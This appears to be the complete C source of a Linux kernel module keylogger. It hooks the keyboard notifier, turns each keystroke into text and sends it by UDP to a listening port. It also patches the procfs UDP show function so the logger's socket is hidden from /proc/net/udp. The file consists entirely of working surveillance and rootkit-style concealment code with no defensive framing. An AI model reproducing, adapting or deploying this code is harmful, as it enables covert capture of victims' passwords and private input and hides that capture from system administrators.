#include <linux/module.h>
#include <linux/init.h>
#include <linux/in.h>
#include <linux/inet.h>
#include <net/sock.h>
#include <linux/keyboard.h>
#include <linux/seq_file.h> /* Needed for seq_file struct */
#include <net/udp.h>      /* Needed for udp_seq_afinfo */

#define NUMBER_OF_KEYCODES sizeof(keycodes)/sizeof(char*)

#define SERVERPORT 5555
#define SOURCEPORT 54545
static struct socket *clientsocket=NULL;
static int len;
static char buf[32] = "";
static struct msghdr msg;
static struct iovec iov;
static mm_segment_t oldfs;
static struct sockaddr_in to,from;
static void sendPacket(void);
static bool hide_sockets = false;

int (*original_udp4_seq_show)(struct seq_file*, void*);
void** udp_hook_fn_ptr;
//short hide_udp_ports

struct sockaddr_in source;





MODULE_LICENSE("GPL");	
static char*
keycodes[] =
{
  "", "ESC", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "-", "=", "BS", "TAB",
  "Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P", "[", "]", "RETURN", "L CTRL",
  "A", "S", "D", "F", "G", "H", "J", "K", "L", ";", "'", "`", "L SHIFT", "\\", "Z",
  "X", "C", "V", "B", "N", "M", ",", ".", "/", "R SHIFT", "*", "L ALT", "SPACE", "CAPS LOCK",
  "F1", "F2", "F3", "F4", "F5", "F6", "F7", "F8", "F9", "F10", "NUM LOCK", "SCROLL LOCK",
  "HOME 7", "UP 8", "PAGE UP 9", "-", "LEFT 4", "5", "RT ARROW 6", "+", "END 1", "DOWN 2",
  "PAGE DOWN 3", "INS", "DEL", "", "", "", "F11", "F12", "", "", "", "", "", "", "", "R RETURN",
  "R CTRL", "/", "PRINT", "R ALT", "", "HOME", "UP", "PAGE UP", "LEFT", "RIGHT", "END", "DOWN",
  "PAGE DOWN", "INSERT", "DEL", "", "", "", "", "", "", "", "PAUSE", 0
};

static char* SHIFTcodes[] =
{
  "", "ESC", "!", "@", "#", "$", "%", "^", "&", "*", "(", ")", "_", "+", "BS", "TAB",
  "Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P", "{", "}", "RETURN", "L CTRL",
  "A", "S", "D", "F", "G", "H", "J", "K", "L", ":", "\"", "~", "L SHIFT", "|", "Z",
  "X", "C", "V", "B", "N", "M", "<", ">", "?", "R SHIFT", "*", "L ALT", "SPACE", "CAPS LOCK",
  "F1", "F2", "F3", "F4", "F5", "F6", "F7", "F8", "F9", "F10", "NUM LOCK", "SCROLL LOCK",
  "HOME 7", "UP 8", "PAGE UP 9", "-", "LEFT 4", "5", "RT ARROW 6", "+", "END 1", "DOWN 2",
  "PAGE DOWN 3", "INS", "DEL", "", "", "", "F11", "F12", "", "", "", "", "", "", "", "R RETURN",
  "R CTRL", "/", "PRINT", "R ALT", "", "HOME", "UP", "PAGE UP", "LEFT", "RIGHT", "END", "DOWN",
  "PAGE DOWN", "INSERT", "DEL", "", "", "", "", "", "", "", "PAUSE", 0
};

static char* SHIFTcodesCAPS[] =
{
  "", "ESC", "!", "@", "#", "$", "%", "^", "&", "*", "(", ")", "_", "+", "BS", "TAB",
  "q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "{", "}", "RETURN", "L CTRL",
  "a", "s", "d", "f", "g", "h", "j", "k", "l", ":", "\"", "~", "L SHIFT", "|", "z",
  "x", "c", "v", "b", "n", "m", "<", ">", "?", "R SHIFT", "*", "L ALT", "SPACE", "CAPS LOCK",
  "F1", "F2", "F3", "F4", "F5", "F6", "F7", "F8", "F9", "F10", "NUM LOCK", "SCROLL LOCK",
  "HOME 7", "UP 8", "PAGE UP 9", "-", "LEFT 4", "5", "RT ARROW 6", "+", "END 1", "DOWN 2",
  "PAGE DOWN 3", "INS", "DEL", "", "", "", "F11", "F12", "", "", "", "", "", "", "", "R RETURN",
  "R CTRL", "/", "PRINT", "R ALT", "", "HOME", "UP", "PAGE UP", "LEFT", "RIGHT", "END", "DOWN",
  "PAGE DOWN", "INSERT", "DEL", "", "", "", "", "", "", "", "PAUSE", 0
};
static char* lowerKeyCodes[] =  {
  "", "ESC", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "-", "=", "BS", "TAB",
  "q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "[", "]", "RETURN", "L CTRL",
  "a", "s", "d", "f", "g", "h", "j", "k", "l", ";", "'", "`", "L SHIFT", "\\", "z",
  "x", "c", "v", "b", "n", "m", ",", ".", "/", "R SHIFT", "*", "L ALT", "SPACE", "CAPS LOCK",
  "F1", "F2", "F3", "F4", "F5", "F6", "F7", "F8", "F9", "F10", "NUM LOCK", "SCROLL LOCK",
  "HOME 7", "UP 8", "PAGE UP 9", "-", "LEFT 4", "5", "RT ARROW 6", "+", "END 1", "DOWN 2",
  "PAGE DOWN 3", "INS", "DEL", "", "", "", "F11", "F12", "", "", "", "", "", "", "", "R RETURN",
  "R CTRL", "/", "PRINT", "R ALT", "", "HOME", "UP", "PAGE UP", "LEFT", "RIGHT", "END", "DOWN",
  "PAGE DOWN", "INSERT", "DEL", "", "", "", "", "", "", "", "PAUSE", 0
};



char* caps = "CAPS LOCK";
bool uppercaseDown = false;
bool uppercase = false;
char* lShift = "L SHIFT";
char* rShift = "R SHIFT";
bool shiftPressed = false;


int keyLogger(struct notifier_block *nblock, unsigned long code, void *_param) {
  struct keyboard_notifier_param *param = _param;
//  int keycode = param->value;

if(code == KBD_KEYCODE && (keycodes[param->value] == lShift || keycodes[param->value] == lShift) && param->down){
shiftPressed = true;
}
if(code == KBD_KEYCODE &&(keycodes[param->value] == lShift || keycodes[param->value] == lShift) && !param->down){
shiftPressed = false;
}
if(code == KBD_KEYCODE && keycodes[param->value] == caps && !param->down)
{
uppercase = !uppercase;
}

if (code == KBD_KEYCODE && param->value < 123 && param->down) {
  memset(buf, 0, sizeof buf);
if(shiftPressed){
if(!uppercase){
    printk(KERN_DEBUG "KEYLOGGER %s \n", SHIFTcodes[param->value]);
    snprintf(buf, sizeof buf, "KEYLOGGER# %s \n", SHIFTcodes[param->value]);
  sendPacket();
return 0;
}
else{
   printk(KERN_DEBUG "KEYLOGGER %s \n", SHIFTcodesCAPS[param->value]);
    snprintf(buf, sizeof buf, "KEYLOGGER# %s \n", SHIFTcodesCAPS[param->value]);
  sendPacket();
return 0;
}}
else{

	if(uppercase)
	{    
	printk(KERN_DEBUG "KEYLOGGER %s \n", keycodes[param->value]);
	snprintf(buf, sizeof buf, "KEYLOGGER# %s \n", keycodes[param->value]);
 	sendPacket();
	return 0;
	}
	else
	{    
	printk(KERN_DEBUG "KEYLOGGER %s \n", lowerKeyCodes[param->value]);
	snprintf(buf, sizeof buf, "KEYLOGGER# %s \n", lowerKeyCodes[param->value]);}
 	sendPacket();
	return 0;
	} 
}

return 0;
}


static void sendPacket(void){
  memset(&msg,0,sizeof(msg));
  msg.msg_name = &to;
  msg.msg_namelen = sizeof(to);

  iov.iov_base = buf;
  iov.iov_len  = sizeof buf;
  msg.msg_control = NULL;
  msg.msg_controllen = 0;
  msg.msg_iov    = &iov;
  msg.msg_iovlen = 1;
  // msg.msg_flags    = MSG_NOSIGNAL;
  //printk(KERN_ERR " vor send\n");
  oldfs = get_fs();
  set_fs( KERNEL_DS );
  len = sock_sendmsg( clientsocket, &msg, sizeof buf );
 
  set_fs( oldfs );
 // printk( KERN_ERR "sock_sendmsg returned: %d\n", len);
}



//------------------- Start Hiding Socket ---------------------------
 int hooked_udp4_seq_show(struct seq_file *seq, void *v)
 {
  struct inet_sock* isk;

	printk(KERN_DEBUG "Hook Function Called");

  if (v == SEQ_START_TOKEN) {
    return original_udp4_seq_show(seq, v);
  }
  isk = inet_sk(v);
	printk(KERN_DEBUG "Port %i to verify sport", ntohs(isk->sport));
	printk(KERN_DEBUG "Port %i to verify dport", ntohs(isk->dport));

  if(hide_sockets)
  if (SOURCEPORT == ntohs(isk->sport) || SOURCEPORT == ntohs(isk->dport)) {
	printk(KERN_DEBUG "Port %i should be hidden", ntohs(isk->sport));
	printk(KERN_DEBUG "Port %i should be hidden", ntohs(isk->dport));
    return 0;
  } 
  return original_udp4_seq_show(seq, v);
}
/*
 * Helper function to find a subdir in procfs
 */
 struct proc_dir_entry* get_pde_subdir(struct proc_dir_entry* pde, const char* name)
 {

  struct proc_dir_entry* result = pde->subdir;
	printk(KERN_DEBUG "searching for dir entry");
  while(result && strcmp(name, result->name)) {
    result = result->next;
  }
  return result;
}

void start_socket_hiding(void)
{
  struct net* net_ns;

    // Iterate all net namespaces
  list_for_each_entry(net_ns, &net_namespace_list, list) {

    // Get the corresponding proc entries
    struct proc_dir_entry* pde_net = net_ns->proc_net;

    struct proc_dir_entry* pde_udp = get_pde_subdir(pde_net, "udp");

    struct udp_seq_afinfo* udp_info = pde_udp->data;

    // Save and hook the UDP show function
    udp_hook_fn_ptr = (void**) &udp_info->seq_ops.show;
    original_udp4_seq_show = *udp_hook_fn_ptr;
    *udp_hook_fn_ptr = hooked_udp4_seq_show;
  }

hide_sockets = true;


}
void end_socket_hiding(void)
{
hide_sockets = false;
}
void end_socket(void)
{
// Restore the hooked funtions
*udp_hook_fn_ptr = original_udp4_seq_show;

if( clientsocket )
    sock_release( clientsocket );
}

//--------------------------- End Hiding Socket ----------------------


static struct notifier_block nb = {
  .notifier_call = keyLogger
};


int keyLoggerInit(void)
{
  if(sock_create( PF_INET,SOCK_DGRAM,IPPROTO_UDP,&clientsocket)<0 ){
    return -EIO;
   }
  memset(&to,0, sizeof(to));
  to.sin_family = AF_INET;
  to.sin_addr.s_addr = in_aton( "127.0.0.1" );  

  to.sin_port = htons( (unsigned short)
      SERVERPORT );

from.sin_family = AF_INET;
from.sin_addr.s_addr= htonl(INADDR_ANY);
from.sin_port=htons(SOURCEPORT); //source port for outgoing packets
 if( (clientsocket->ops->bind(clientsocket,(struct sockaddr *)&from,sizeof(from))) ) {
    sock_release( clientsocket );
    return -EIO;
  }
  register_keyboard_notifier(&nb);

  return 0;
}


void keyLoggerRrelease(void)
{
  unregister_keyboard_notifier(&nb);
  end_socket();
}
